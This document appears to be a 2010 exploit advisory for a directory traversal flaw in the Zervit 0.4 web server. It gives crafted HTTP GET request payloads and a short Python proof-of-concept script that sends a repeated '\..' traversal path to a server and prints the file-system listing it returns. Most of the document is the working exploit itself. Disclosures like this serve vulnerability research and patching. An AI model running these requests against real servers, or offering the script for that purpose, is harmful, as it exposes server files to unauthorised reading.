#============================================================================================================#
#   _      _   __   __       __        _______    _____      __ __     _____     _      _    _____  __ __    #
#  /_/\  /\_\ /\_\ /\_\     /\_\     /\_______)\ ) ___ (    /_/\__/\  ) ___ (   /_/\  /\_\ /\_____\/_/\__/\  #
#  ) ) )( ( ( \/_/( ( (    ( ( (     \(___  __\// /\_/\ \   ) ) ) ) )/ /\_/\ \  ) ) )( ( (( (_____/) ) ) ) ) #
# /_/ //\\ \_\ /\_\\ \_\    \ \_\      / / /   / /_/ (_\ \ /_/ /_/ // /_/ (_\ \/_/ //\\ \_\\ \__\ /_/ /_/_/  #
# \ \ /  \ / // / // / /__  / / /__   ( ( (    \ \ )_/ / / \ \ \_\/ \ \ )_/ / /\ \ /  \ / // /__/_\ \ \ \ \  #
#  )_) /\ (_(( (_(( (_____(( (_____(   \ \ \    \ \/_\/ /   )_) )    \ \/_\/ /  )_) /\ (_(( (_____\)_) ) \ \ #
#  \_\/  \/_/ \/_/ \/_____/ \/_____/   /_/_/     )_____(    \_\/      )_____(   \_\/  \/_/ \/_____/\_\/ \_\/ #
#                                                                                                            #
#============================================================================================================#
#                                                                                                            #
# Vulnerability............Directory Traversal                                                               #
# Software.................Zervit 0.4                                                                        #
# Download.................http://sourceforge.net/projects/zervit/                                           #
# Date.....................5/11/10                                                                           #
#                                                                                                            #
#============================================================================================================#
#                                                                                                            #
# Site.....................http://cross-site-scripting.blogspot.com/                                         #
# Email....................john.leitch5@gmail.com                                                            #
#                                                                                                            #
#============================================================================================================#
#                                                                                                            #
# ##Description##                                                                                            #
#                                                                                                            #
# It's possible to navigate the local file system of a server running Zervit 0.4 by using a specially        #
# crafted HTTP request. The resource path must be relative and the slashes unencoded.                        #
#                                                                                                            #
#                                                                                                            #
# ##Exploit##                                                                                                #
#                                                                                                            #
# GET /\../ HTTP/1.1                                                                                         #
# Host: localhost                                                                                            #
#                                                                                                            #
# or                                                                                                         #
#                                                                                                            #
# GET //../ HTTP/1.1                                                                                         #
# Host: localhost                                                                                            #
#                                                                                                            #
#                                                                                                            #
# ##Proof of Concept##                                                                                       #
import sys, struct, socket
host ='localhost'
port = 80

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send('GET /' + '\..' * 32 + '/ HTTP/1.1\r\n'
       'Host: ' + host + '\r\n\r\n')

while 1:
    response = s.recv(8192)
    if not response: break
    print response
            


